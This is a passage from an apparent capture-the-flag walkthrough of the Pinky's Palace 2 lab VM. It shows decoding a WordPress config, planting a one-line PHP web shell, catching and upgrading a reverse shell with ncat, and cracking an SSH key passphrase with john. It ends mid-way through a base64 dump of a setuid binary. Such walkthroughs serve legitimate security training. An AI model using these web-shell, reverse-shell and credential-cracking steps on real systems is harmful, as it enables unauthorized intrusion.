UgaWYgeW91IGdpdmUgZWFjaA0KICogYSB1bmlxdWUgcHJlZml4LiBPbmx5IG51bWJlcnMsIGxldHRlcnMsIGFuZCB1bmRlcnNjb3JlcyBwbGVhc2UhDQogKi8NCiR0YWJsZV9wcmVmaXggID0gJ3dwXyc7DQoNCi8qKg0KICogRm9yIGRldmVsb3BlcnM6IFdvcmRQcmVzcyBkZWJ1Z2dpbmcgbW9kZS4NCiAqDQogKiBDaGFuZ2UgdGhpcyB0byB0cnVlIHRvIGVuYWJsZSB0aGUgZGlzcGxheSBvZiBub3RpY2VzIGR1cmluZyBkZXZlbG9wbWVudC4NCiAqIEl0IGlzIHN0cm9uZ2x5IHJlY29tbWVuZGVkIHRoYXQgcGx1Z2luIGFuZCB0aGVtZSBkZXZlbG9wZXJzIHVzZSBXUF9ERUJVRw0KICogaW4gdGhlaXIgZGV2ZWxvcG1lbnQgZW52aXJvbm1lbnRzLg0KICoNCiAqIEZvciBpbmZvcm1hdGlvbiBvbiBvdGhlciBjb25zdGFudHMgdGhhdCBjYW4gYmUgdXNlZCBmb3IgZGVidWdnaW5nLA0KICogdmlzaXQgdGhlIENvZGV4Lg0KICoNCiAqIEBsaW5rIGh0dHBzOi8vY29kZXgud29yZHByZXNzLm9yZy9EZWJ1Z2dpbmdfaW5fV29yZFByZXNzDQogKi8NCmRlZmluZSgnV1BfREVCVUcnLCBmYWxzZSk7DQoNCi8qIFRoYXQncyBhbGwsIHN0b3AgZWRpdGluZyEgSGFwcHkgYmxvZ2dpbmcuICovDQoNCi8qKiBBYnNvbHV0ZSBwYXRoIHRvIHRoZSBXb3JkUHJlc3MgZGlyZWN0b3J5LiAqLw0KaWYgKCAhZGVmaW5lZCgnQUJTUEFUSCcpICkNCglkZWZpbmUoJ0FCU1BBVEgnLCBkaXJuYW1lKF9fRklMRV9fKSAuICcvJyk7DQoNCi8qKiBTZXRzIHVwIFdvcmRQcmVzcyB2YXJzIGFuZCBpbmNsdWRlZCBmaWxlcy4gKi8NCnJlcXVpcmVfb25jZShBQlNQQVRIIC4gJ3dwLXNldHRpbmdzLnBocCcpOw0K
root@kali:~/Pinkys-Palace2#
```

```sh
root@kali:~/Pinkys-Palace2# base64 -d wp-config.php.b64 > wp-config.php
root@kali:~/Pinkys-Palace2# less wp-config.php
root@kali:~/Pinkys-Palace2#
```

![](images/25.png)

![](images/26.png)

![](images/27.png)

![](images/28.png)

###### Reverse Shell

```php
<?php echo system($_REQUEST['cmd']); ?>
```

![](images/29.png)

![](images/30.png)

![](images/31.png)

![](images/32.png)

[`Upgrading simple shells to fully interactive TTYs`](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

```sh
root@kali:~/Pinkys-Palace2# ncat -lvnp 9001
Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 278C 4432 C60B 16BB 8FD2 D7DB 66CC 7888 E44A 75E9
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 192.168.1.26.
Ncat: Connection from 192.168.1.26:56482.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@Pinkys-Palace:~/html/nginx/pinkydb/html$ ^Z
[1]+  Stopped                 ncat -lvnp 9001
root@kali:~/Pinkys-Palace2# echo $TERM
xterm-256color
root@kali:~/Pinkys-Palace2# stty -a
speed 38400 baud; rows 51; columns 204; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = M-^?; eol2 = M-^?; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc ixany imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
root@kali:~/Pinkys-Palace2# stty raw -echo
root@kali:~/Pinkys-Palace2# ncat -lvnp 9001

www-data@Pinkys-Palace:~/html/nginx/pinkydb/html$ export SHELL=bash
www-data@Pinkys-Palace:~/html/nginx/pinkydb/html$ export TERM=xterm256-color
www-data@Pinkys-Palace:~/html/nginx/pinkydb/html$ stty rows 51 columns 204
www-data@Pinkys-Palace:~/html/nginx/pinkydb/html$ ls -l
total 24
-rw-r--r-- 1 www-data www-data  215 Mar 16 01:11 config.php
drwxr-xr-x 2 www-data www-data 4096 Mar 17 03:56 credentialsdir1425364865
-rw-r--r-- 1 www-data www-data  206 Mar 16 03:54 filesselif1001.php
-rw-r--r-- 1 www-data www-data  134 Mar 16 00:20 index.php
-rw-r--r-- 1 www-data www-data 1103 Mar 17 00:55 login.php
-rw-r--r-- 1 www-data www-data   34 Mar 16 03:16 pageegap.php
www-data@Pinkys-Palace:~/html/nginx/pinkydb/html$
www-data@Pinkys-Palace:~$ cd /home/
www-data@Pinkys-Palace:/home$ ls -l
total 12
drwxr-x--- 3 demon   demon   4096 Mar 17 20:02 demon
drwxr-x--- 3 pinky   pinky   4096 Mar 17 21:27 pinky
drwxr-xr-x 4 stefano stefano 4096 Mar 17 21:27 stefano
www-data@Pinkys-Palace:/home$ cd stefano/
www-data@Pinkys-Palace:/home/stefano$ ll
bash: ll: command not found
www-data@Pinkys-Palace:/home/stefano$ ls -l
total 4
drwxr-xr-x 2 stefano stefano 4096 Mar 17 04:01 tools
www-data@Pinkys-Palace:/home/stefano$ cd tools/
www-data@Pinkys-Palace:/home/stefano/tools$ ls -l
total 20
-rw-r--r-- 1 stefano stefano     65 Mar 16 04:28 note.txt
-rwsr----x 1 pinky   www-data 13384 Mar 16 04:40 qsub
www-data@Pinkys-Palace:/home/stefano/tools$ file qsub
qsub: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e35337e922a770c832f5e2b0a9afc5819887bd10, not stripped
www-data@Pinkys-Palace:/home/stefano/tools$
www-data@Pinkys-Palace:/home/stefano/tools$ ./qsub
bash: ./qsub: Permission denied
www-data@Pinkys-Palace:/home/stefano/tools$
```

###### Crack SSH keys

```sh
root@kali:~/Pinkys-Palace2# ssh2john id_rsa > stefano.key.crack
root@kali:~/Pinkys-Palace2# john stefano.key.crack --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA 32/32])
Press 'q' or Ctrl-C to abort, almost any other key for status
secretz101       (id_rsa)
1g 0:00:00:02 DONE (2018-04-29 15:40) 0.5000g/s 652884p/s 652884c/s 652884C/s secretz101
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~/Pinkys-Palace2#
```

```sh
root@kali:~/Pinkys-Palace2# chmod 600 id_rsa
```

```sh
root@kali:~/Pinkys-Palace2# ssh -p 4655 -i id_rsa stefano@192.168.1.26
Enter passphrase for key 'id_rsa':
Linux Pinkys-Palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Mar 17 21:18:01 2018 from 172.19.19.2
stefano@Pinkys-Palace:~$ ls
tools
stefano@Pinkys-Palace:~$ cd tools/
stefano@Pinkys-Palace:~/tools$ ls
note.txt  qsub
stefano@Pinkys-Palace:~/tools$ cat note.txt
Pinky made me this program so I can easily send messages to him.
stefano@Pinkys-Palace:~/tools$ ./qsub
./qsub <Message>
stefano@Pinkys-Palace:~/tools$ ./qsub test
[+] Input Password: test
[!] Incorrect Password!
stefano@Pinkys-Palace:~/tools$
```

```sh
www-data@Pinkys-Palace:/home/stefano/tools$ base64 qsub
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAMAkAAAAAAABAAAAAAAAAAIgsAAAAAAAAAAAAAEAAOAAJ
AEAAHwAeAAYAAAAFAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA+AEAAAAAAAD4AQAAAAAAAAgA
AAAAAAAAAwAAAAQAAAA4AgAAAAAAADgCAAAAAAAAOAIAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
AAAAAAABAAAABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHwOAAAAAAAAfA4AAAAAAAAAACAA
AAAAAAEAAAAGAAAA2B0AAAAAAADYHSAAAAAAANgdIAAAAAAAuAIAAAAAAADAAgAAAAAAAAAAIAAA
AAAAAgAAAAYAAADwHQAAAAAAAPAdIAAAAAAA8B0gAAAAAADgAQAAAAAAAOABAAAAAAAACAAAAAAA
AAAEAAAABAAAAFQCAAAAAAAAVAIAAAAAAABUAgAAAAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAA
AFDldGQEAAAACA0AAAAAAAAIDQAAAAAAAAgNAAAAAAAARAAAAAAAAABEAAAAAAAAAAQAAAAAAAAA
UeV0ZAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAABS
5XRkBAAAANgdAAAAAAAA2B0gAAAAAADYHSAAAAAAACgCAAAAAAAAKAIAAAAAAAABAAAAAAAAAC9s
aWI2NC9sZC1saW51eC14ODYtNjQuc28uMgAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAAGAAAAIAAA
AAQAAAAUAAAAAwAAAEdOVQDjUzfpIqdwyDL14rCpr8WBmIe9EAIAAAAUAAAAAQAAAAYAAAAAgAAA
ACAAAAAAAAAUAAAAT9udfAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABDAAAAEgAAAAAAAAAA
AAAAAAAAAAAAAACTAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAfAAAAEgAAAAAAAAAAAAAAAAAAAAAA
AABKAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAkAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAEgAA
AAAAAAAAAAAAAAAAAAAAAABUAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAEgAAAAAAAAAAAAAA
AAAAAAAAAABjAAAAEgAAAAAAAAAAAAAAAAAAAAAAAACBAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAB6
AAAAEgAAAAAAAAAAAAAAAAAAAAAAAACvAAAAIAAAAAAAAAAAAAAAAAAAAAAAAABbAAAAEgAAAAAA
AAAAAAAAAAAAAAAAAAA6AAAAEgAAAAAAAAAAAAAAAAAAAAAAAAC+AAAAIAAAAAAAAAAAAAAAAAAA
AAAAAAAQAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAALAAAAEgAAAAAAAAAAAAAAAAAAAAAAAADSAAAA
IAAAAAAAAAAAAAAAAAAAAAAAAABrAAAAIgAAAAAAAAAAAAAAAAAAAAAAAAArAAAAEgAOAGAKAAAA
AAAANwAAAAAAAAAAbGliYy5zby42AGV4aXQAX19pc29jOTlfc2NhbmYAcHV0cwBzdHJsZW4Ac2Vu
ZABzZXRyZXNnaWQAYXNwcmludGYAZ2V0ZW52AHNldHJlc3VpZABzeXN0ZW0AZ2V0ZWdpZABnZXRl
dWlkAF9fY3hhX2ZpbmFsaXplAHN0cmNtcABfX2xpYmNfc3RhcnRfbWFpbgBfSVRNX2RlcmVnaXN0
ZXJUTUNsb25lVGFibGUAX19nbW9uX3N0YXJ0X18AX0p2X1JlZ2lzdGVyQ2xhc3NlcwBfSVRNX3Jl
Z2lzdGVyVE1DbG9uZVRhYmxlAEdMSUJDXzIuNwBHTElCQ18yLjIuNQAAAAIAAAACAAIAAgACAAIA
AgACAAIAAgAAAAIAAgAAAAMAAgAAAAIAAQAAAAAAAQACAAEAAAAQAAAAAAAAABdpaQ0AAAMA7AAA
ABAAAAB1GmkJAAACAPYAAAAAAAAA2B0gAAAAAAAIAAAAAAAAADAKAAAAAAAA4B0gAAAAAAAIAAAA
AAAAAPAJAAAAAAAAiCAgAAAAAAAIAAAAAAAAAIggIAAAAAAA0B8gAAAAAAAGAAAAAgAAAAAAAAAA
AAAA2B8gAAAAAAAGAAAACgAAAAAAAAAAAAAA4B8gAAAAAAAGAAAADAAAAAAAAAAAAAAA6B8gAAAA
AAAGAAAADwAAAAAAAAAAAAAA8B8gAAAAAAAGAAAAEgAAAAAAAAAAAAAA+B8gAAAAAAAGAAAAEwAA
AAAAAAAAAAAAGCAgAAAAAAAHAAAAAQAAAAAAAAAAAAAAICAgAAAAAAAHAAAAAwAAAAAAAAAAAAAA
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
hgZIDjiDB00OQHIOOEEOMEEOKEIOIEIOGEIOEEIOCAAUAAAA5AAAANj9//8CAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAwCgAAAAAAAPAJAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAADAAAAAAAAAAoCAAAAAAA
AA0AAAAAAAAARAwAAAAAAAAZAAAAAAAAANgdIAAAAAAAGwAAAAAAAAAIAAAAAAAAABoAAAAAAAAA
4B0gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAACYAgAAAAAAAAUAAAAAAAAAuAQAAAAAAAAG
AAAAAAAAAMACAAAAAAAACgAAAAAAAAACAQAAAAAAAAsAAAAAAAAAGAAAAAAAAAAVAAAAAAAAAAAA
AAAAAAAAAwAAAAAAAAAAICAAAAAAAAIAAAAAAAAAOAEAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAA
AAAAAADwBgAAAAAAAAcAAAAAAAAAGAYAAAAAAAAIAAAAAAAAANgAAAAAAAAACQAAAAAAAAAYAAAA
AAAAAPv//28AAAAAAAAACAAAAAD+//9vAAAAAOgFAAAAAAAA////bwAAAAABAAAAAAAAAPD//28A
AAAAugUAAAAAAAD5//9vAAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwHSAAAAAAAAAAAAAAAAAA
